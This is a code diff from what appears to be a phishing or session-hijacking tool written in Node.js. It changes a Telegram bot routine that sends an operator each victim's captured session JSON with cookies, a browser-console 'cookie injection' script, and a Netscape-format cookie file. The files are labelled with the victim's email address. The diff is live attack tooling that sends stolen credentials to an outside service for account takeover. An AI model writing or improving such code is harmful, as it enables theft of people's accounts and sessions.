@@ -1088,18 +1088,30 @@ ${adminUrl}
 
                 // Send session JSON file if it exists
                 if (sessionFile && fs.existsSync(sessionFile)) {
-                    await this.bot.sendDocument(chatId, sessionFile, {
+                    const sessionBuffer = fs.readFileSync(sessionFile);
+                    const sessionFilename = path.basename(sessionFile);
+                    
+                    await this.bot.sendDocument(chatId, sessionBuffer, {
                         caption: `📄 <b>Session Data (JSON)</b>\n\nComplete session data with ${totalCookies} cookies for ${email}`,
                         parse_mode: 'HTML'
+                    }, {
+                        filename: sessionFilename,
+                        contentType: 'application/json'
                     });
                     console.log(`📎 Sent session JSON file to ${chatId}`);
                 }
 
                 // Send injection script if it exists
                 if (injectFile && fs.existsSync(injectFile)) {
-                    await this.bot.sendDocument(chatId, injectFile, {
+                    const injectBuffer = fs.readFileSync(injectFile);
+                    const injectFilename = path.basename(injectFile);
+                    
+                    await this.bot.sendDocument(chatId, injectBuffer, {
                         caption: `🚀 <b>Cookie Injection Script</b>\n\nRun this in browser console to inject cookies for ${email}`,
                         parse_mode: 'HTML'
+                    }, {
+                        filename: injectFilename,
+                        contentType: 'application/javascript'
                     });
                     console.log(`📎 Sent injection script to ${chatId}`);
                 }
@@ -1151,10 +1163,16 @@ ${adminUrl}
             const netscapeFile = sessionFile.replace('.json', '_cookies.txt');
             fs.writeFileSync(netscapeFile, netscapeContent);
 
-            // Send Netscape format file
-            await this.bot.sendDocument(chatId, netscapeFile, {
+            // Send Netscape format file as buffer
+            const netscapeBuffer = fs.readFileSync(netscapeFile);
+            const netscapeFilename = path.basename(netscapeFile);
+            
+            await this.bot.sendDocument(chatId, netscapeBuffer, {
                 caption: `🍪 <b>Browser Cookie File (Netscape Format)</b>\n\nImport this file directly into browsers for ${email}`,
                 parse_mode: 'HTML'
+            }, {
+                filename: netscapeFilename,
+                contentType: 'text/plain'
             });
 
             // Clean up temporary file
